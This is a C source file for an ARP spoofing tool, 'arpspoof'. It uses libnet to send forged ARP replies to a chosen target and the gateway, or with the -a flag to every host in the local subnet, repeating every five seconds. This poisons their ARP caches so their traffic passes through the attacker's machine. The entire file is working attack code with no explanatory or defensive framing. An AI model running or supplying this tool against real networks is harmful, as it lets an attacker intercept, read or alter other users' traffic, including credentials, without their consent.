#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/param.h>
#include <arpa/inet.h>
#include <libnet.h>
#include <pcap.h>
#include "version.h"
#include "common.h"
#include "route.h"

void usage(void)
{
	fprintf(stderr, "Version: " VERSION "\n"
		"Usage: arpspoof [-i interface] [-a] [-t target]\n");
	exit(1);
}

int arp_send(libnet_t *pnet_context, uint16_t op, uint32_t spa, uint32_t tpa)
{
    struct libnet_ether_addr    *sha, tha;
    int                         sent_bytes;

    libnet_clear_packet(pnet_context);

    //get my own mac address
    sha = libnet_get_hwaddr(pnet_context);

    if(!sha){
        printf("%s\n", libnet_geterror(pnet_context));
        return -1;
    }

    //get target mac address
    if(find_macaddr_by_ip(pnet_context->device, tpa, (unsigned char *)(&tha.ether_addr_octet)) == false){
        //printf("find_macaddr_by_ip error.\n");
        return -1;
    }
	libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4,
						op, sha->ether_addr_octet, &spa, tha.ether_addr_octet, &tpa, NULL, 0, pnet_context, 0);

	libnet_build_ethernet(tha.ether_addr_octet, sha->ether_addr_octet, ETHERTYPE_ARP, NULL, 0, pnet_context, 0);
	
    sent_bytes = libnet_write(pnet_context);
	
    if(sent_bytes == -1){
        printf("%s\n", libnet_geterror(pnet_context));
        return -1;
    }
	
    if(op == ARPOP_REPLY){
        struct in_addr spa_addr = {.s_addr = spa};
        struct in_addr tpa_addr = {.s_addr = tpa};
		
        printf("ARPOP_REPLY  src:%s (%s) --> ", inet_ntoa(spa_addr), ethernet_mactoa(sha->ether_addr_octet));
        printf("dst:%s (%s)\n", inet_ntoa(tpa_addr), ethernet_mactoa(tha.ether_addr_octet));
    }
	
    return 0;
}

//arpspoof -i eth0 -t target host
int main(int argc, char *argv[])
{
	int			c;
	char 		err_buf[LIBNET_ERRBUF_SIZE];
	char		*target_ip_string = NULL;
	char        *devname = NULL;
	libnet_t	*pnet_context = NULL;
    uint32_t    target_ip = 0;
	bool		isall = false;
	struct 		ifcfg	if_config;
	int			sockfd;
	__be32		ip_gateway;
	
	while((c = getopt(argc, argv, "i:t:ah")) != -1){
		switch(c){
		case 'i':
			devname = optarg;
			break;
		case 'a':
			isall = true;
			break;
		case 't':
			target_ip_string = optarg;
			break;
		default:
			usage();
		}
	}
	
	argc -= optind;
	argv += optind;
	
	if(!devname){
		usage();
	}
	
	if(!isall){
		if(!target_ip_string){
			usage();
		}
	}
	
	pnet_context = libnet_init(LIBNET_LINK, devname, err_buf);
	
	if(!pnet_context){
		printf("%s\n", err_buf);
		return 0;
	}
	
	if(!isall){
		if((target_ip = libnet_name2addr4(pnet_context, target_ip_string, LIBNET_RESOLVE)) == -1){
			usage();
		}
	}
	
	/* Open PF_PACKET socket, listening for EtherType ETHER_TYPE */
	if ((sockfd = socket(PF_PACKET, SOCK_RAW, 0)) == -1) {
		perror("listener: socket");
		return -1;
	}
	
	if_config.iface = devname;
	
	if(get_local_info(sockfd, &if_config)){
		perror("Unable to get network device info \n");
		return -1;
	}
	
	close(sockfd);
	
	/* Get gateway IP*/
	ip_gateway = get_gateway();
	
    for(;;){
		
		if(isall){
			int		i = 0;
			uint	fooled_ip;
			uint	num = 0xFFFFFFFF - if_config.nmask.s_addr;
			
			for(i = 0;i < num;++i){
				fooled_ip = if_config.ip_subnet + i;
				
				if(fooled_ip == if_config.ipa.s_addr || 
					fooled_ip == if_config.bcast.s_addr || 
					fooled_ip == if_config.ip_subnet ||
					fooled_ip == ntohl(ip_gateway) ){
					continue;
				}
				
				if(arp_send(pnet_context, ARPOP_REPLY, ip_gateway, htonl(fooled_ip)) == 0){
					arp_send(pnet_context, ARPOP_REPLY, htonl(fooled_ip), ip_gateway);
				}
			}
		}else{
			if(arp_send(pnet_context, ARPOP_REPLY, ip_gateway, target_ip) == 0){
				arp_send(pnet_context, ARPOP_REPLY, target_ip, ip_gateway);
			}
		}
		
        printf("\n");
        sleep(5);
		
    }
	
	exit(0);
}
